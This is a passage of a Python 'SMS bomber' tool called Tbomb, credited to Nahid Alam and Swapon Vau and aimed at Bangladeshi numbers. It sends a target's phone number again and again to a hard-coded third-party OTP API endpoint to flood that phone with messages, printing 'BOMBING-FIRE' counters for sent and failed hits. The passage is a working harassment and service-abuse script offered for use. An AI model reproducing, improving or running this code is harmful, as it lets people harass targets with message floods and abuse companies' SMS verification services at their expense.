# Tbomb
This is sms bomber
			else:
				url=url = "https://0yzk2chfm3.execute-api.ap-southeast-1.amazonaws.com/prod/user/otp"
				headers=CaseInsensitiveDict()
				headers["Content-Type"]="application/json"
				datagp="""{\"mobile_number\":\"+88"""+number+"""\"}"""
				r=requests.post(url, headers=headers, data=datagp)
				
					
					
			if ammount2==1:
				print(cyan+"\n\t  ★★BOMBING-FIRE★★==>   "+green+"[✓] 1st SMS Sent.")
			elif ammount2==2:
				print(cyan+"\n\t  ★★BOMBING-FIRE★★==>   "+green+"[✓] 2nd SMS Sent.")
			elif ammount2==3:
				print(cyan+"\n\t  ★★BOMBING-FIRE★★==>   "+green+"[✓] 3rd SMS Sent.")
			else:
				print(cyan+"\n\t  ★★BOMBING-FIRE★★==>   "+green+"[✓] "+str(ammount2)+"th SMS Sent.")
			time.sleep(1)
			totalsent+=1
			ammount2+=1
		except:
			if ammount2==1:
				print(cyan+"\n\t  ★★Problem★★==>   "+red+"[×] 1st SMS Not Sent.")
			elif ammount2==2:
				print(cyan+"\n\t  ★★Problem★★==>   "+red+"[×] 2nd SMS Not Sent.")
			elif ammount2==3:
				print(cyan+"\n\t  ★★Problem★★==>   "+red+"[×] 3rd SMS Not Sent.")
			else:
				print(cyan+"\n\t  ★★Problem★★==>   "+red+"[×] "+str(ammount2)+"th SMS Not Sent.")
				time.sleep(10)
				ammount2+=1
								
							
	totalhit=ammount2-1
	totalnotsent=totalhit-totalsent
	print(cyan+"\n\n\t\t[•] Total Hits : "+yellow+str(totalhit))
	print(green+"\n\t\t[✓] Total Sent : "+yellow+str(totalsent))
	print(red+"\n\t\t[×] Total Not Sent : "+yellow+str(totalnotsent)+"\n")
	lastt=str(input(cyan+"\n\n\t\t  [✓] All Done!\n\t [•] Now Press Enter Key To Continue\n"))
	os.system('clear')
	notice=""
	text=green+"\n\n\t\t★★★Nahid Alam | SMS Tools★★★   \n" 
	header()
	opt()

		
elif opt2=="2":
	os.system("python3 SwaponTbomb.py")
else:
	text=cyan+"\t\tTOOL BY : Swapon Vau"+green+"\n\n\t\t★★ Nahid Alam | Bangladesh SMS Bomber ★★   \n" 
	notice=red+"\n\t\t[×] Wrong Value Entered"
	os.system('clear')
	header()
	opt()
	continue
